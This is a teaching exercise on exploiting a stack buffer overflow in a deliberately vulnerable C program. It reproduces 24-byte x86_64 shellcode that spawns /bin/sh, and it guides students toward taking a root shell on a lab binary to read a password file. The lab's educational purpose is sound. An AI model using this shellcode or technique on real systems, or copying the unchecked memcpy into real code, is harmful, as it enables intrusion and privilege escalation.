Excercise Buffer Overflow Stack
-------------------------------


The code we will use for our exploitation is as follows:

.. code:: c

    #include <stdio.h>
    #include <string.h>

    int main(int argc, char **argv) {
      char buffer[16];
      char buffer2[16];

      buffer[15]='\0';
      buffer2[15]='\0';

      printf("Hello Buffers\n\n");

      for (int i=0;i<argc;i++){
        printf("argv[%d]: %s\n", i, argv[i]);

      }
      printf("Buffer2: @%p\n", &buffer2);
      printf("Buffer : @%p\n", &buffer);

      memcpy(buffer2,argv[1], strlen(argv[1]));

      printf("Buffer2: @%p [%s]\n", &buffer2, buffer2);
      printf("Buffer : @%p [%s]\n", &buffer, buffer);

      return 0;
    }


Tasks: The code contains a buffer overflow vulnerability. The goal of this
excercise is to exploit this vulnerability and use it to spawn a shell.

#. Locate the buffer overflow vulnerability inside the code

#. Compile your code as follows:

   ``gcc -g stack_variables/stack.c -z execstack -o output/stack_exec_stack``

#. Play around with the command line arguments and understand what happens
   inside the code

   ``./output/stack_exec_stack parameter``

#. Answer the following questions:
   
   #. How many Bytes do you need to overflow until you receive a segmentation
      fault?
   
   #. How many Bytes are available in your buffer?

#. Got to https://www.exploit-db.com/exploits/42179/ , look at the file
   ``exploit_shellcode.c`` or check the summary below.
   
   Quick summary:
       .. code::
        
        ##########
        # Source #
        ##########
        section .text
            global _start
            _start:
              push rax           /*
              xor rdx, rdx        * Prolog
              xor rsi, rsi        */
              mov rbx,'/bin//sh' /* important line! */
              push rbx           /* 
              push rsp            * setup stack frame
              pop rdi             */
              mov al, 59         /* xx refers to ??? syscall*/
              syscall            /* execute ???*/

        ######################## 
        # shellcode (24 bytes) #
        ########################
        
            \x50\x48\x31\xd2\x48\x31\xf6\x48
            \xbb\x2f\x62\x69\x6e\x2f\x2f\x73
            \x68\x53\x54\x5f\xb0\x3b\x0f\x05

#. Try to understand what the shellcode does. Questions:

   #. Which syscall is used by the shellcode?
   #. Why is the 1st parameter put in a register?


#. Use the shellcode and find a way how to inject this code into your
   buffers.

   - E.g. ``./output/stack_exec_stack $(python -c 'print "\x50..."')``

#. Figure out the padding you will need between your buffer and the return
   address

#. Figure out the correct address that points to your shellcode and overwrite
   the areturn address accordingly. (Note: X86_64 uses little endian byte
   order!)

#. Put everything together in a single command line argument and execute your
    exploit.

#. There is a precompiled version of this program available.
    ``output/stack_exec_root``. Use what you learnt and exploit this program instead.

    - Once you have a shell (this time this is a root shell) 
      read the contents of the file ``secret`` to get the password for the root account.


